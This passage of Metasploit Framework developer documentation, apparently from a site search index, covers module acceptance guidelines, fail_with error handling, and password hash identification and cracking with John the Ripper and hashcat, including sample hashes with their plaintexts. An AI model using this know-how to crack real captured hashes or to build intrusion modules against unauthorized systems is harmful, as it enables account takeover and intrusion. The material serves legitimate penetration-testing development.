mediate sockets through Rex and Rex::Proto methods instead. This ensures compatibility with the full set of Framework features, such as pivoting and proxy chaining. Web application attacks are generally uninteresting (SQLi, XSS, CSRF), unless the module can reliably result in a shell or exercise some kind of useful information leak. Even in that case, the module should \"just work,\" as above. Web application attacks should be limited only to popular, widely deployed applications. For example, a SQLi module against a popular CMS that results in a shell on the CMS machine would be welcome. A module that causes a private Facebook profile to become public would not (Facebook has exactly one deployed instance). Web application attacks should implement an HttpFingerprint constant. Modules should only list targets that you actually tested the exploit on. Avoid assuming it works on a specific system if it has never been tested on it. Comments above the target entry indicating additional information about a given target (language pack, patch level, etc) greatly assist other developers in creating additional targets and improving your module. Modules can exercise unpatched and undisclosed vulnerabilities. However, Rapid7 is happy to assist with the disclosure process by following the Rapid7 policy. This policy provides a fixed 90-day window from when the vendor is contacted until the exploit is released. All vulnerabilities found by Rapid7 staff follow this process. The submitter will receive full credit for the vulnerability and the resulting exploit module regardless of how disclosure is handled. Framework Enhancements Generally, new functionality to the Metasploit Framework should start life as a plugin. If the functionality becomes useful and popular, we can integrate it more closely, add RPC API exposure, and so on, but it should be well-tested by the community before then. Automating a series of discrete functions is generally /not/ the responsibility of the Framework. Automation should be accomplished through the API (see Metasploit Community/Pro, MSFGUI, etc). Past efforts with in-Framework automation prove this out. Components such as db_autopwn and browser_autopwn rarely did what users expected, and configuring these tools became a nightmare through increasingly complex sets of options and arguments. Automating the Framework is easy and should stay easy, but the automation itself should live in resource scripts and other external front-ends to the Framework itself. Console functionality should have a focus on exploit and security tool development, with the exploit developer as the typical user. End users should be pointed to an interface such as the Community Edition or MSFGUI and should not expect much in terms of user-friendliness from the console. The console should be considered a debug mode for Metasploit and as close to bare-metal functionality as possible. External tools, such msfpayload and msfvenom , are designed to make exploit development easier and exercise specific techniques. We are happy to continue evaluating tools of this nature for inclusion in the Framework; these should be accompanied by documentation (!), how-to tutorials for quick start, and other helpful text.","title":"Acceptance Guidelines"},{"location":"dev/dark/Guidelines-for-Accepting-Modules-and-Enhancements/#acceptance-guidelines","text":"Contributions from the open source community are the soul of Metasploit, and we love evaluating and landing pull requests that add new Framework features and content. Metasploit Framework has many tens of thousands of users who rely on daily, consistent, and error-free updates. Because of this, Metasploit's core developers have adopted a fairly high standard for pull requests that add new Framework functionality and Metasploit modules. In order to encourage open and transparent development, this document outlines some general guidelines for Metasploit contributors and developers. Adhering to these guidelines maximizes the chances that your work will be merged into the official Metasploit distribution packages.","title":"Acceptance Guidelines"},{"location":"dev/dark/Guidelines-for-Accepting-Modules-and-Enhancements/#module-additions","text":"Most open source community support for Metasploit comes in the form of Metasploit modules. The following should be considered for acceptance; note that these are guidelines and not categorical imperatives (\"should\"s, not \"must\"s), since there are always exceptions to the norm\u2014especially when it comes to novel new attacks and techniques. Modules should pass msftidy.rb and adhere to the CONTRIBUTING.md guidelines. Both are distributed with Metasploit. See [[Style Tips]] for some information on how to take some of the headache out of whitespace issues. Modules should have a clear and obvious goal: Exploits should result in a shell. Post modules should result in privilege escalation or loot. Auxiliary modules are an \"Everything else\" category, but even they should be limited to a well-defined task\u2014(e.g., information gathering to enable an exploit or a post module). Modules should not launch other modules, given the complexity of setting multiple payloads. Such actions are usually automation tasks for an external UI. Denial of Service modules should be asymmetric and at least have some interesting feature. If it's comparable to a synflood, it shouldn't be included. If it's comparable to Baliwicked, it should be included. Modules that hover the line, such as slowloris, may be included with some justification. Modules should be able to function as expected with minimal configuration. Defaults should be sensible and usually correct. Modules should not depend on exact timing, uncontrollable heap states, system DLLs, etc. All memory addresses (ie. a JMP ESP, or a ROP gadget) should be part of the metadata under 'Targets', and documented (what instructions it points to, and what DLL). If the exploit is against a specific hardware (e.g., routers, PLCs, etc), or against a software that's not free (and no trial/demo available), please remember to submit a binary packet capture (pcap-formatted) along with the module that demonstrates the exploit actually works. Please don't use the alphanum encoder as a way to avoid BadChar analysis. Modules which set the EncoderType field in the payload as a way to avoid doing real BadChar analysis will be rejected. These modules are nearly always unreliable in the real world. Exploit ranking definitions can be found on the [[Exploit Ranking]] page. Exploit modules should implement a check() function when this is trivial to do so. Versions exposed through banners or network protocols should always result in a check() routine when a patch is available that changes this version. If a module (auxiliary or post) obtains some sort of information from the victim machine, it should store that data using one (or more) of the following methods: store_loot() : Used to store both stolen files (both text and binary) and \"screencaps\" of commands such as a ps -ef and ifconfig . The file itself need not be of forensic-level integrity -- they may be parsed by a post module to extract only the relevant information for a penetration tester. report_auth_info() : Used to store working credentials that are immediately reusable by another module. For example, a module dumping the local SMB hashes would use this, as would a module which reads username:password combinations for a specific host and service. Specifically, merely \"likely\" usernames and passwords should use store_loot() instead. report_vuln() : Auxiliary and post modules that exercise a particular vulnerability should report_vuln() upon success. Note that exploit modules automatically report_vuln() as part of opening a session (there is no need to call it especially). report_note() : Modules should make an effort to avoid report_note() when one of the above methods would be a better fit, but there are often cases where \"loot\" or \"cred\" or \"vuln\" classifications are not immediately appropriate. report_note() calls should always set a OID-style dotted :type , such as domain.hosts , so other modules may easily find them in the database. Modules should take advantage of the normal Metasploit APIs. For example, they should not attempt to create their own TCP sockets or application protocols with native Ruby; they should mediate sockets through Rex and Rex::Proto methods instead. This ensures compatibility with the full set of Framework features, such as pivoting and proxy chaining. Web application attacks are generally uninteresting (SQLi, XSS, CSRF), unless the module can reliably result in a shell or exercise some kind of useful information leak. Even in that case, the module should \"just work,\" as above. Web application attacks should be limited only to popular, widely deployed applications. For example, a SQLi module against a popular CMS that results in a shell on the CMS machine would be welcome. A module that causes a private Facebook profile to become public would not (Facebook has exactly one deployed instance). Web application attacks should implement an HttpFingerprint constant. Modules should only list targets that you actually tested the exploit on. Avoid assuming it works on a specific system if it has never been tested on it. Comments above the target entry indicating additional information about a given target (language pack, patch level, etc) greatly assist other developers in creating additional targets and improving your module. Modules can exercise unpatched and undisclosed vulnerabilities. However, Rapid7 is happy to assist with the disclosure process by following the Rapid7 policy. This policy provides a fixed 90-day window from when the vendor is contacted until the exploit is released. All vulnerabilities found by Rapid7 staff follow this process. The submitter will receive full credit for the vulnerability and the resulting exploit module regardless of how disclosure is handled.","title":"Module Additions"},{"location":"dev/dark/Guidelines-for-Accepting-Modules-and-Enhancements/#framework-enhancements","text":"Generally, new functionality to the Metasploit Framework should start life as a plugin. If the functionality becomes useful and popular, we can integrate it more closely, add RPC API exposure, and so on, but it should be well-tested by the community before then. Automating a series of discrete functions is generally /not/ the responsibility of the Framework. Automation should be accomplished through the API (see Metasploit Community/Pro, MSFGUI, etc). Past efforts with in-Framework automation prove this out. Components such as db_autopwn and browser_autopwn rarely did what users expected, and configuring these tools became a nightmare through increasingly complex sets of options and arguments. Automating the Framework is easy and should stay easy, but the automation itself should live in resource scripts and other external front-ends to the Framework itself. Console functionality should have a focus on exploit and security tool development, with the exploit developer as the typical user. End users should be pointed to an interface such as the Community Edition or MSFGUI and should not expect much in terms of user-friendliness from the console. The console should be considered a debug mode for Metasploit and as close to bare-metal functionality as possible. External tools, such msfpayload and msfvenom , are designed to make exploit development easier and exercise specific techniques. We are happy to continue evaluating tools of this nature for inclusion in the Framework; these should be accompanied by documentation (!), how-to tutorials for quick start, and other helpful text.","title":"Framework Enhancements"},{"location":"dev/dark/Handling-module-failures-with-`fail_with`/","text":"When a module fails, the fail_with method provides a standardized way to describe the reason for the failure. The first parameter depends on the cause of the failure. Example uses modules/exploits/osx/local/sudo_password_bypass.rb fails using Failure::NotVulnerable if the check method does not indicate that the target is indeed vulnerable: if check != CheckCode::Vulnerable fail_with Failure::NotVulnerable, 'Target is not vulnerable' end modules/exploits/multi/http/struts2_namespace_ognl.rb fails using the Failure::PayloadFailed if the target's response does not include a string indicating that the payload successfully executed. Alternatively, if the target responds with an HTTP error, the module invokes fail_with using the Failure::UnexpectedReply parameter: if r && r.headers && r.headers['Location'].split('/')[1] == success_string print_good(\"Payload successfully dropped and executed.\") elsif r && r.headers['Location'] vprint_error(\"RESPONSE: \" + r.headers['Location']) fail_with(Failure::PayloadFailed, \"Target did not successfully execute the request\") elsif r && r.code == 400 fail_with(Failure::UnexpectedReply, \"Target reported an unspecified error while executing the payload\") end Comprehensive list of fail_with parameters The following are currently used fail_with parameters, and a brief description of common uses. fail_with parameter Reason for failure Failure::BadConfig The user-provided parameters are invalid and must be corrected. Failure::Disconnected The target closed the connection forcibly. Failure::NoAccess An attempt to authenticate failed, likely due to invalid credentials. Failure::None The outcome for the module has already been met (eg. a privilege escalation is already in an elevated context) Failure::NoTarget The specified TARGET or PAYLOAD variables are misconfigured or the target environment is unsupported. Failure::NotFound A preexisting file or resource on target is missing. Failure::NotVulnerable The target returned a response indicative of being patched or otherwise mitigated. Failure::PayloadFailed A return code from payload execution indicates the payload did not execute or terminated unexpectedly. Failure::TimeoutExpired The target did not respond to the connection request in a timely manner. Check RHOSTS and RPORT, then consider increasing WFSDelay. Failure::UnexpectedReply The target responded in an entirely unexpected way, and may not be running the vulnerable service at all. Failure::Unknown An entirely unexpected exception occurred, and the target may not be running the expected services at all. Failure::Unreachable The host or service is not reachable, often indicated by a refused connection or ICMP \"unreachable\" message.","title":"Handling module failures with `fail with`"},{"location":"dev/dark/Handling-module-failures-with-`fail_with`/#example-uses","text":"modules/exploits/osx/local/sudo_password_bypass.rb fails using Failure::NotVulnerable if the check method does not indicate that the target is indeed vulnerable: if check != CheckCode::Vulnerable fail_with Failure::NotVulnerable, 'Target is not vulnerable' end modules/exploits/multi/http/struts2_namespace_ognl.rb fails using the Failure::PayloadFailed if the target's response does not include a string indicating that the payload successfully executed. Alternatively, if the target responds with an HTTP error, the module invokes fail_with using the Failure::UnexpectedReply parameter: if r && r.headers && r.headers['Location'].split('/')[1] == success_string print_good(\"Payload successfully dropped and executed.\") elsif r && r.headers['Location'] vprint_error(\"RESPONSE: \" + r.headers['Location']) fail_with(Failure::PayloadFailed, \"Target did not successfully execute the request\") elsif r && r.code == 400 fail_with(Failure::UnexpectedReply, \"Target reported an unspecified error while executing the payload\") end","title":"Example uses"},{"location":"dev/dark/Handling-module-failures-with-`fail_with`/#comprehensive-list-of-fail_with-parameters","text":"The following are currently used fail_with parameters, and a brief description of common uses. fail_with parameter Reason for failure Failure::BadConfig The user-provided parameters are invalid and must be corrected. Failure::Disconnected The target closed the connection forcibly. Failure::NoAccess An attempt to authenticate failed, likely due to invalid credentials. Failure::None The outcome for the module has already been met (eg. a privilege escalation is already in an elevated context) Failure::NoTarget The specified TARGET or PAYLOAD variables are misconfigured or the target environment is unsupported. Failure::NotFound A preexisting file or resource on target is missing. Failure::NotVulnerable The target returned a response indicative of being patched or otherwise mitigated. Failure::PayloadFailed A return code from payload execution indicates the payload did not execute or terminated unexpectedly. Failure::TimeoutExpired The target did not respond to the connection request in a timely manner. Check RHOSTS and RPORT, then consider increasing WFSDelay. Failure::UnexpectedReply The target responded in an entirely unexpected way, and may not be running the vulnerable service at all. Failure::Unknown An entirely unexpected exception occurred, and the target may not be running the expected services at all. Failure::Unreachable The host or service is not reachable, often indicated by a refused connection or ICMP \"unreachable\" message.","title":"Comprehensive list of fail_with parameters"},{"location":"dev/dark/Hashes-and-Password-Cracking/","text":"Intro WORK IN PROGRESS - This page is a work in progress as the hashcat functionality is included in the metasploit framework, and as documentation is put together. The information on this page may quickly become outdated, but can be used as a general guide. This article will discuss the various libraries, dependencies, and functionality built in to metasploit for dealing with password hashes, and cracking them. In general, this will not cover storing credentials in the database, which can be read about here . Metasploit currently support cracking passwords with John the Ripper and (soon as of Apr 2, 2019) hashcat . Hashes Many modules gather dump hashes from various software. Anything from the OS: Windows , OSX , and Linux , to applications such as postgres , and oracle . Similar, to the hash-identifier project, metasploit includes a library to identify the type of a hash in a standard way. identify.rb can be given a hash, and will return the jtr type. Metasploit standardizes to John the Ripper 's types. While you may know the hash type being dumped already, using this library will help standardize future changes. Hash Identify Example In this first, simple, example we will simply show loading the library and calling its function. require 'metasploit/framework/hashes/identify' puts identify_hash \"$1$28772684$iEwNOgGugqO9.bIz5sk8k/\" # note, bad hashes return an empty string since nil is not accepted when creating credentials in msf. puts identify_hash \"This_is a Fake Hash\" puts identify_hash \"_9G..8147mpcfKT8g0U.\" In practice, we receive the following output from this: msf5 > irb [*] Starting IRB shell... [*] You are in the \"framework\" object irb: warn: can't alias jobs from irb_jobs. >> require 'metasploit/framework/hashes/identify' => false >> puts identify_hash \"$1$28772684$iEwNOgGugqO9.bIz5sk8k/\" md5 => nil >> puts identify_hash \"This_is a Fake Hash\" => nil >> puts identify_hash \"_9G..8147mpcfKT8g0U.\" des,bsdi,crypt Crackers Differences Between Hashcat vs JtR This section will cover the differences between the two crackers. This is not a comparison of speed, or why one may work better in a specific case than another. General Settings Description JtR hashcat session --session --session no logging --nolog --logfile-disable config file --config (n/a) previous cracks --pot --potfile-path type of hashes --format --hash-type wordlist --wordlist (last parameter) incremental --incremental --increment rules --rules --rules-file max run time --max-run-time --runtime show results --show --show Hash Setting Hash JtR hashcat List formats john --list=formats john --list=format-all-details hashcat -h des descrypt 1500 md5 (crypt is 1 1 ) md5crypt 500 sha1 100 bsdi bsdicrypt 12400 sha256 sha256crypt 7400 sha512 sha512crypt 1800 blowfish bcrypt 3200 lanman lm 3000 NTLM nt 1000 mssql (05) mssql 131 mssql12 mssql12 1731 mssql (2012/2014) mssql05 132 oracle (10) oracle 3100 oracle 11 oracle11 112 oracle 12 oracle12c 12300 postgres dynamic_1034 12 mysql mysql 200 mysql-sha1 mysql-sha1 300 While Metasploit standardizes with the JtR format, the hashcat library includes the jtr_format_to_hashcat_format function to translate from jtr to hashcat. Example Hashes Hashcat * hashcat.net JtR * pentestmonkey.net * openwall.info For testing Hashcat/JtR integration, this is a common list of commands to import example hashes of many different types. When possible the username is separated by an underscore, and anything after it is the password. For example des_password , the password for the hash is password : creds add user:des_password hash:rEK1ecacw.7.c jtr:des creds add user:md5_password hash:$1$O3JMY.Tw$AdLnLjQ/5jXF9.MTp3gHv/ jtr:md5 creds add user:bsdi_password hash:_J9..K0AyUubDrfOgO4s jtr:bsdi creds add user:sha256_password hash:$5$MnfsQ4iN$ZMTppKN16y/tIsUYs/obHlhdP.Os80yXhTurpBMUbA5 jtr:sha256,crypt creds add user:sha512_password hash:$6$zWwwXKNj$gLAOoZCjcr8p/.VgV/FkGC3NX7BsXys3KHYePfuIGMNjY83dVxugPYlxVg/evpcVEJLT/rSwZcDMlVVf/bhf.1 jtr:sha512,crypt creds add user:blowfish_password hash:$2a$05$bvIG6Nmid91Mu9RcmmWZfO5HJIMCT8riNW0hEp8f6/FuA2/mHZFpe jtr:bf creds add user:lm_password ntlm:E52CAC67419A9A224A3B108F3FA6CB6D:8846F7EAEE8FB117AD06BDD830B7586C jtr:lm creds add user:nt_password ntlm:AAD3B435B51404EEAAD3B435B51404EE:8846F7EAEE8FB117AD06BDD830B7586C jtr:nt creds add user:mssql05_toto hash:0x01004086CEB6BF932BC4151A1AF1F13CD17301D70816A8886908 jtr:mssql05 creds add user:mssql_foo hash:0x0100A607BA7C54A24D17B565C59F1743776A10250F581D482DA8B6D6261460D3F53B279CC6913CE747006A2E3254 jtr:mssql creds add user:mssql12_Password1! hash:0x0200F733058A07892C5CACE899768F89965F6BD1DED7955FE89E1C9A10E27849B0B213B5CE92CC9347ECCB34C3EFADAF2FD99BFFECD8D9150DD6AACB5D409A9D2652A4E0AF16 jtr:mssql12 creds add user:mysql_probe hash:445ff82636a7ba59 jtr:mysql creds add user:mysql-sha1_tere hash:*5AD8F88516BD021DD43F171E2C785C69F8E54ADB jtr:mysql-sha1 ## oracle (10) uses usernames in the hashing, so we can't overide that here creds add user:simon hash:4F8BC1809CB2AF77 jtr:des,oracle creds add user:SYSTEM hash:9EEDFA0AD26C6D52 jtr:des,oracle ## oracle 11/12 H value, username is used creds add user:DEMO hash:'S:8F2D65FB5547B71C8DA3760F10960428CD307B1C6271691FC55C1F56554A;H:DC9894A01797D91D92ECA1DA66242209;T:23D1F8CAC9001F69630ED2DD8DF67DD3BE5C470B5EA97B622F757FE102D8BF14BEDC94A3CC046D10858D885DB656DC0CBF899A79CD8C76B788744844CADE54EEEB4FDEC478FB7C7CBFBBAC57BA3EF22C' jtr:raw-sha1,oracle ## oracle 11/12 uses a LONG format, see lib/msf/core/auxiliary/jtr.rb creds add user:oracle11_epsilon hash:'S:8F2D65FB5547B71C8DA3760F10960428CD307B1C6271691FC55C1F56554A;H:DC9894A01797D91D92ECA1DA66242209;T:23D1F8CAC9001F69630ED2DD8DF67DD3BE5C470B5EA97B622F757FE102D8BF14BEDC94A3CC046D10858D885DB656DC0CBF899A79CD8C76B788744844CADE54EEEB4FDEC478FB7C7CBFBBAC57BA3EF22C' jtr:raw-sha1,oracle creds add user:oracle12c_epsilon hash:'H:DC9894A01797D91D92ECA1DA66242209;T:E3243B98974159CC24FD2C9A8B30BA62E0E83B6CA2FC7C55177C3A7F82602E3BDD17CEB9B9091CF9DAD672B8BE961A9EAC4D344BDBA878EDC5DCB5899F689EBD8DD1BE3F67BFF9813A464382381AB36B' jtr:pbkdf2,oracle12c ##postgres uses username, so we can't overide that here creds add user:example postgres:md5be86a79bf2043622d58d5453c47d4860 This data breaks down to the following table: Hash Type Username Hash Password jtr format Modules which dump this info Modules which crack this DES des_password rEK1ecacw.7.c password des auxiliary/analyze/jtr_aix auxiliary/analyze/jtr_linux MD5 md5_password $1$O3JMY.Tw$AdLnLjQ/5jXF9.MTp3gHv/ password md5 auxiliary/analyze/jtr_linux BSDi bsdi_password _J9..K0AyUubDrfOgO4s password bsdi auxiliary/analyze/jtr_linux SHA256 sha256_password $5$MnfsQ4iN$ZMTppKN16y/tIsUYs/obHlhdP.Os80yXhTurpBMUbA5 password sha256,crypt auxiliary/analyze/jtr_linux SHA512 sha512_password $6$zWwwXKNj$gLAOoZCjcr8p/.VgV/FkGC3NX7BsXys3KHYePfuIGMNjY83dVxugPYlxVg/evpcVEJLT/rSwZcDMlVVf/bhf.1 password sha512,crypt auxiliary/analyze/jtr_linux Blowfish blowfish_password $2a$05$bvIG6Nmid91Mu9RcmmWZfO5HJIMCT8riNW0hEp8f6/FuA2/mHZFpe password bf auxiliary/analyze/jtr_linux Lanman lm_password E52CAC67419A9A224A3B108F3FA6CB6D:8846F7EAEE8FB117AD06BDD830B7586C password lm auxiliary/analyze/jtr_windows_fast NTLM nt_password AAD3B435B51404EEAAD3B435B51404EE:8846F7EAEE8FB117AD06BDD830B7586C password nt auxiliary/analyze/jtr_windows_fast MSSQL (2005) mssql05_toto 0x01004086CEB6BF932BC4151A1AF1F13CD17301D70816A8886908 toto mssql05 auxiliary/scanner/mssql/mssql_hashdump auxiliary/analyze/jtr_mssql_fast MSSQL mssql_foo 0x0100A607BA7C54A24D17B565C59F1743776A10250F581D482DA8B6D6261460D3F53B279CC6913CE747006A2E3254 foo mssql auxiliary/scanner/mssql/mssql_hashdump auxiliary/analyze/jtr_mssql_fast MSSQL (2012) mssql12_Password1! 0x0200F733058A07892C5CACE899768F89965F6BD1DED7955FE89E1C9A10E27849B0B213B5CE92CC9347ECCB34C3EFADAF2FD99BFFECD8D9150DD6AACB5D409A9D2652A4E0AF16 Password! mssql12 auxiliary/scanner/mssql/mssql_hashdump auxiliary/analyze/jtr_mssql_fast MySQL mysql_probe 445ff82636a7ba59 probe mysql auxiliary/scanner/mysql/mysql_hashdump auxiliary/analyze/jtr_mysql_fast MySQL SHA1 mysql-sha1_tere *5AD8F88516BD021DD43F171E2C785C69F8E54ADB tere mysql-sha1 auxiliary/scanner/mysql/mysql_hashdump auxiliary/analyze/jtr_mysql_fast Oracle simon 4F8BC1809CB2AF77 A des,oracle auxiliary/scanner/oracle/oracle_hashdump auxiliary/analyze/jtr_oracle_fast Oracle SYSTEM 9EEDFA0AD26C6D52 THALES des,oracle auxiliary/scanner/oracle/oracle_hashdump auxiliary/analyze/jtr_oracle_fast Oracle 11 DEMO S:8F2D65FB5547B71C8DA3760F10960428CD307B1C6271691FC55C1F56554A;H:DC9894A01797D91D92ECA1DA66242209;T:23D1F8CAC9001F69630ED2DD8DF67DD3BE5C470B5EA97B622F757FE102D8BF14BEDC94A3CC046D10858D885DB656DC0CBF899A79CD8C76B788744844CADE54EEEB4FDEC478FB7C7CBFBBAC57BA3EF22C epsilon raw-sha1,oracle auxiliary/scanner/oracle/oracle_hashdump auxiliary/analyze/jtr_oracle_fast Oracle 11 oracle11_epsilon S:8F2D65FB5547B71C8DA3760F10960428CD307B1C6271691FC55C1F56554A;H:DC9894A01797D91D92ECA1DA66242209;T:23D1F8CAC9001F69630ED2DD8DF67DD3BE5C470B5EA97B622F757FE102D8BF14BEDC94A3CC046D10858D885DB656DC0CBF899A79CD8C76B788744844CADE54EEEB4FDEC478FB7C7CBFBBAC57BA3EF22C epsilon raw-sha1,oracle modules/auxiliary/scanner/oracle/oracle_hashdump auxiliary/analyze/jtr_oracle_fast Oracle 12 oracle12_epsilon H:DC9894A01797D91D92ECA1DA66242209;T:E3243B98974159CC24FD2C9A8B30BA62E0E83B6CA2FC7C55177C3A7F82602E3BDD17CEB9B9091CF9DAD672B8BE961A9EAC4D344BDBA878EDC5DCB5899F689EBD8DD1BE3F67BFF9813A464382381AB36B epsilon pbkdf2,oracle12c auxiliary/scanner/oracle/oracle_hashdump auxiliary/analyze/jtr_oracle_fast Postgres example md5be86a79bf2043622d58d5453c47d4860 password raw-md5,postgres auxiliary/scanner/postgres/postgres_hashdump auxiliary/analyze/jtr_postgres_fast","title":"Intro"},{"location":"dev/dark/Hashes-and-Password-Cracking/#intro","text":"WORK IN PROGRESS - This page is a work in progress as the hashcat functionality is included in the metasploit framework, and as documentation is put together. The information on this page may quickly become outdated, but can be used as a general guide. This article will discuss the various libraries, dependencies, and functionality built in to metasploit for dealing with password hashes, and cracking them. In general, this will not cover storing credentials in the database, which can be read about here . Metasploit currently support cracking passwords with John the Ripper and (soon as of Apr 2, 2019) hashcat .","title":"Intro"},{"location":"dev/dark/Hashes-and-Password-Cracking/#hashes","text":"Many modules gather dump hashes from various software. Anything from the OS: Windows , OSX , and Linux , to applications such as postgres , and oracle . Similar, to the hash-identifier project, metasploit includes a library to identify the type of a hash in a standard way. identify.rb can be given a hash, and will return the jtr type. Metasploit standardizes to John the Ripper 's types. While you may know the hash type being dumped already, using this library will help standardize future changes.","title":"Hashes"},{"location":"dev/dark/Hashes-and-Password-Cracking/#hash-identify-example","text":"In this first, simple, example we will simply show loading the library and calling its function. require 'metasploit/framework/hashes/identify' puts identify_hash \"$1$28772684$iEwNOgGugqO9.bIz5sk8k/\" # note, bad hashes return an empty string since nil is not accepted when creating credentials in msf. puts identify_hash \"This_is a Fake Hash\" puts identify_hash \"_9G..8147mpcfKT8g0U.\" In practice, we receive the following output from this: msf5 > irb [*] Starting IRB shell... [*] You are in the \"framework\" object irb: warn: can't alias jobs from irb_jobs. >> require 'metasploit/framework/hashes/identify' => false >> puts identify_hash \"$1$28772684$iEwNOgGugqO9.bIz5sk8k/\" md5 => nil >> puts identify_hash \"This_is a Fake Hash\" => nil >> puts identify_hash \"_9G..8147mpcfKT8g0U.\" des,bsdi,crypt","title":"Hash Identify Example"},{"location":"dev/dark/Hashes-and-Password-Cracking/#crackers","text":"","title":"Crackers"},{"location":"dev/dark/Hashes-and-Password-Cracking/#differences-between-hashcat-vs-jtr","text":"This section will cover the differences between the two crackers. This is not a comparison of speed, or why one may work better in a specific case than another.","title":"Differences Between Hashcat vs JtR"},{"location":"dev/dark/Hashes-and-Password-Cracking/#general-settings","text":"Description JtR hashcat session --session --session no logging --nolog --logfile-disable config file --config (n/a) previous cracks --pot --potfile-path type of hashes --format --hash-type wordlist --wordlist (last parameter) incremental --incremental --increment rules --rules --rules-file max run time --max-run-time --runtime show results --show --show","title":"General Settings"},{"location":"dev/dark/Hashes-and-Password-Cracking/#hash-setting","text":"Hash JtR hashcat List formats john --list=formats john --list=format-all-details hashcat -h des descrypt 1500 md5 (crypt is 1 1 ) md5crypt 500 sha1 100 bsdi bsdicrypt 12400 sha256 sha256crypt 7400 sha512 sha512crypt 1800 blowfish bcrypt 3200 lanman lm 3000 NTLM nt 1000 mssql (05) mssql 131 mssql12 mssql12 1731 mssql (2012/2014) mssql05 132 oracle (10) oracle 3100 oracle 11 oracle11 112 oracle 12 oracle12c 12300 postgres dynamic_1034 12 mysql mysql 200 mysql-sha1 mysql-sha1 300 While Metasploit standardizes with the JtR format, the hashcat library includes the jtr_format_to_hashcat_format function to translate from jtr to hashcat.","title":"Hash Setting"},{"location":"dev/dark/Hashes-and-Password-Cracking/#example-hashes","text":"Hashcat * hashcat.net JtR * pentestmonkey.net * openwall.info For testing Hashcat/JtR integration, this is a common list of commands to import example hashes of many different types. When possible the username is separated by an underscore, and anything after it is the password. For example des_password , the password for the hash is password : creds add user:des_password hash:rEK1ecacw.7.c jtr:des creds add user:md5_password hash:$1$O3JMY.Tw$AdLnLjQ/5jXF9.MTp3gHv/ jtr:md5 creds add user:bsdi_password hash:_J9..K0AyUubDrfOgO4s jtr:bsdi creds add user:sha256_password hash:$5$MnfsQ4iN$ZMTppKN16y/tIsUYs/obHlhdP.Os80yXhTurpBMUbA5 jtr:sha256,crypt creds add user:sha512_password hash:$6$zWwwXKNj$gLAOoZCjcr8p/.VgV/FkGC3NX7BsXys3KHYePfuIGMNjY83dVxugPYlxVg/evpcVEJLT/rSwZcDMlVVf/bhf.1 jtr:sha512,crypt creds add user:blowfish_password hash:$2a$05$bvIG6Nmid91Mu9RcmmWZfO5HJIMCT8riNW0hEp8f6/FuA2/mHZFpe jtr:bf creds add user:lm_password ntlm:E52CAC67419A9A224A3B108F3FA6CB6D:8846F7EAEE8FB117AD06BDD830B7586C jtr:lm creds add user:nt_password ntlm:AAD3B435B51404EEAAD3B435B51404EE:8846F7EAEE8FB117AD06BDD830B7586C jtr:nt creds add user:mssql05_toto hash:0x01004086CEB6BF932BC4151A1AF1F13CD17301D70816A8886908 jtr:mssql05 creds add user:mssql_foo hash:0x0100A607BA7C54A24D17B565C59F1743776A10250F581D482DA8B6D6261460D3F53B279CC6913CE747006A2E3254 jtr:mssql creds add user:mssql12_Password1! hash:0x0200F733058A07892C5CACE899768F89965F6BD1DED7955FE89E1C9A10E27849B0B213B5CE92CC9347ECCB34C3EFADAF2FD99BFFECD8D9150DD6AACB5D409A9D2652A4E0AF16 jtr:mssql12 creds add user:mysql_probe hash:445ff82636a7ba59 jtr:mysql creds add user:mysql-sha1_tere hash:*5AD8F88516BD021DD43F171E2C785C69F8E54ADB jtr:mysql-sha1 ## oracle (10) uses usernames in the hashing, so we can't overide that here creds add user:simon hash:4F8BC1809CB2AF77 jtr:des,oracle creds add user:SYSTEM hash:9EEDFA0AD26C6D52 jtr:des,oracle ## oracle 11/12 H value, username is used creds add user:DEMO hash:'S:8F2D65FB5547B71C8DA3760F10960428CD307B1C6271691FC55C1F56554A;H:DC9894A01797D91D92ECA1DA66242209;T:23D1F8CAC9001F69630ED2DD8DF67DD3BE5C470B5EA97B622F757FE102D8BF14BEDC94A3CC046D10858D885DB656DC0CBF899A79CD8C76B788744844CADE54EEEB4FDEC478FB7C7CBFBBAC57BA3EF22C' jtr:raw-sha1,oracle ## oracle 11/12 uses a LONG format, see lib/msf/core/auxiliary/jtr.rb creds add user:oracle11_epsilon hash:'S:8F2D65FB5547B71C8DA3760F10960428CD307B1C6271691FC55C1F56554A;H:DC9894A01797D91D92ECA1DA66242209;T:23D1F8CAC9001F69630ED2DD8DF67DD3BE5C470B5EA97B622F757FE102D8BF14BEDC94A3CC046D10858D885DB656DC0CBF899A79CD8C76B788744844CADE54EEEB4FDEC478FB7C7CBFBBAC57BA3EF22C' jtr:raw-sha1,oracle creds add user:oracle12c_epsilon hash:'H:DC9894A01797D91D92ECA1DA66242209;T:E3243B98974159CC24FD2C9A8B30BA62E0E83B6CA2FC7C55177C3A7F82602E3BDD17CEB9B9091CF9DAD672B8BE961A9EAC4D344BDBA878EDC5DCB5899F689EBD8DD1BE3F67BFF9813A464382381AB36B' jtr:pbkdf2,oracle12c ##postgres uses username, so we can't overide that here creds add user:example postgres:md5be86a79bf2043622d58d5453c47d4860 This data breaks down to the following table: Hash Type Username Hash Password jtr format Modules which dump this info Modules which crack this DES des_password rEK1ecacw.7.c password des auxiliary/analyze/jtr_aix auxiliary/analyze/jtr_linux MD5 md5_password $1$O3JMY.Tw$AdLnLjQ/5jXF9.MTp3gHv/ password md5 auxiliary/analyze/jtr_linux BSDi bsdi_password _J9..K0AyUubDrfOgO4s password bsdi auxiliary/analyze/jtr_linux SHA256 sha256_password $5$MnfsQ4iN$ZMTppKN16y/tIsUYs/obHlhdP.Os80yXhTurpBMUbA5 password sha256,crypt auxiliary/analyze/jtr_linux SHA512 sha512_password $6$zWwwXKNj$gLAOoZCjcr8p/.VgV/FkGC3NX7BsXys3KHYePfuIGMNjY83dVxugPYlxVg/evpcVEJLT/rSwZcDMlVVf/bhf.1 password sha512,crypt auxiliary/analyze/jtr_linux Blowfish blowfish_password $2a$05$bvIG6Nmid91Mu9RcmmWZfO5HJIMCT8riNW0hEp8f6/FuA2/mHZFpe password bf auxiliary/analyze/jtr_linux Lanman lm_password E52CAC67419A9A224A3B108F3FA6CB6D:8846F7EAEE8FB117AD06BDD830B7586C password lm auxiliary/analyze/jtr_windows_fast NTLM nt_password AAD3B435B51404EEAAD3B435B51404EE:8846F7EAEE8FB117AD06BDD830B7586C password nt auxiliary/analyze/jtr_windows_fast MSSQL (2005) mssql05_toto 0x01004086CEB6BF932BC4151A1AF1F13CD17301D70816A8886908 toto mssql05 auxiliary/scanner/mssql/mssql_hashdump auxiliary/analyze/jtr_mssql_fast MSSQL mssql_foo 